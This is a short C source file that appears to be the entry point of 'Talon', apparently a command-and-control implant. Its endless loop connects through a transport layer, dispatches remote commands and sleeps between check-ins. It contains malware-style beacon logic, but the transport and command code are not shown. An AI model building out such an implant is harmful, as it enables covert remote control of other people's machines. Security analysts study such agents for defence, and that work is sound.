#include <Talon.h>

#include <Core.h>
#include <Transport.h>
#include <Command.h>

INSTANCE Instance = { 0 };

void entry()
{
    TalonInit();
    do
    {
        if ( ! Instance.Session.Connected )
        {
            if ( TransportInit( ) )
                CommandDispatcher();
        }

        // Instance->Win32.WaitForSingleObjectEx( NtCurrentThread(), Instance->Config.Sleeping * 1000, FALSE );

        Sleep( 3 * 1000 );

    } while ( TRUE );
}